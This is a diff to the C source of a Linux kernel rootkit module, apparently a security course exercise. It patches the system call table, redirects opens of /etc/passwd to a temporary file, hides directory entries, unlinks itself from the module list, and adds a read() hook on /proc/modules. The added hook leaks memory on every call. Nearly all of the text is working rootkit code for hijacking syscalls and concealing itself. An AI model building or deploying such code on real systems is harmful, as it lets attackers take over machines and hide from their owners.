@@ -15,9 +15,12 @@
 #define PREFIX "sneaky_process"
 #define PASSWORDFILE "/etc/passwd"
 #define TEMPPASSWORDFILE "/tmp/passwd"
+#define MODULESFILE "/proc/modules"
 #define PATH_LENGTH 100
 
 static struct list_head *prev_module;
+
+int proc_modules_fd = 0;
 
 // process id argument
 static int pid;
@@ -55,7 +58,12 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   if(strcmp(kpathname, PASSWORDFILE) == 0) {
     copy_to_user(pathname, temppathname, sizeof(temppathname));
   }
-  return (*original_openat)(regs);
+  if(strcmp(kpathname, MODULESFILE) == 0) {
+    proc_modules_fd = (*original_openat)(regs);
+    return proc_modules_fd;
+  } else {
+    return (*original_openat)(regs);
+  }
 }
 
 // getdents64
@@ -82,10 +90,28 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
     }
     bpos += current_entry->d_reclen;
   }
-
-  // printk(KERN_DEBUG "getdents64 called\n");
+    // printk(KERN_DEBUG "getdents64 called\n");
 
   return nread;
+}
+
+//read
+asmlinkage int (*original_read)(struct pt_regs *);
+asmlinkage int sneaky_read(struct pt_regs *regs) {
+  int fd = regs->di;
+  char *buf = (char *)regs->si;
+  size_t count = regs->dx;
+
+  char* kbuf = kvzalloc(count, GFP_KERNEL);
+
+  int ret = original_read(regs);
+
+  if(fd == proc_modules_fd) {
+    strncpy_from_user(kbuf, buf, count);
+    printk(KERN_DEBUG "%s", kbuf);
+  }
+
+  return ret;
 }
 
 // The code that gets executed when the module is loaded
@@ -103,6 +129,7 @@ static int initialize_sneaky_module(void)
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
   original_getdents64 = (void *)sys_call_table[__NR_getdents64];
+  original_read = (void *)sys_call_table[__NR_read];
   
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
@@ -110,6 +137,7 @@ static int initialize_sneaky_module(void)
   // You need to replace other system calls you need to hack here
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
+  sys_call_table[__NR_read] = (unsigned long)sneaky_read;
 
   // Hide sneaky_mod
   prev_module = THIS_MODULE->list.prev;
@@ -136,6 +164,7 @@ static void exit_sneaky_module(void)
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
+  sys_call_table[__NR_read] = (unsigned long)original_read;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);  
